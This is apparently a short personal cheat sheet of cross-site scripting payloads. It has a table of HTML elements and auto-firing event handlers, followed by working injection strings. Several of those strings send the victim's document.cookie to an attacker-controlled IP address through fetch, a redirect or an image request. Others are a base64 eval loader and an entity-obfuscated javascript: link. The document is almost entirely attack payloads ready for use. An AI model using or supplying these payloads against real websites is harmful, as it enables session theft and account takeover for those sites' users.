# XSS PAYLOADS
-

## Auto-Triggered 

| Element | Common Events | Example Structure |
|----------|--------------|------------------|
| `<body>` | `onload` | `<body onload="XSS_PAYLOAD">` |
| `<img>` | `onload`, `onerror` | `<img src="invalid" onerror="XSS_PAYLOAD">` |
| `<svg>` | `onload` | `<svg onload="XSS_PAYLOAD">` |
| `<iframe>` | `onload` | `<iframe onload="XSS_PAYLOAD">` |
| `<video>` | `onload`, `onerror` | `<video onerror="XSS_PAYLOAD">` |
| `<audio>` | `onload`, `onerror` | `<audio onerror="XSS_PAYLOAD">` |
| `<a>` | `onclick`, `onmouseover` | `<a onclick="XSS_PAYLOAD">Link</a>` |
| `<button>` | `onclick` | `<button onclick="XSS_PAYLOAD">Click</button>` |
| `<div>` | `onclick`, `onmouseover` | `<div onclick="XSS_PAYLOAD">Content</div>` |
| `<input>` | `onfocus`, `onchange` | `<input onfocus="XSS_PAYLOAD">` |
| `<textarea>` | `onfocus`, `onchange` | `<textarea onfocus="XSS_PAYLOAD"></textarea>` |
| `<form>` | `onsubmit` | `<form onsubmit="XSS_PAYLOAD">` |


<img src=x onerror="xss_PAYLOAD">
<img src=x onerror="fetch('http://192.168.160.106:8000/test.png')">
<img src=x onerror="window.location='http://192.168.160.106:8000/?cookie='+document.cookie;">
username=<body onload=\"new Image().src='http://192.168.160.106:8080?c='+document.cookie;\">

fetch('http://IP ADDRESS/?c=' + document.cookie)
<svg onload="eval(atob('BASE64 ENCODE PAYLOAD'))">

ENCODED - > base64 playload -> pop up
<a href=ja&#x0D;vascript&colon;\u0065val(\u0061tob("YWxlcnQoInhzcyIp"))>test</a>
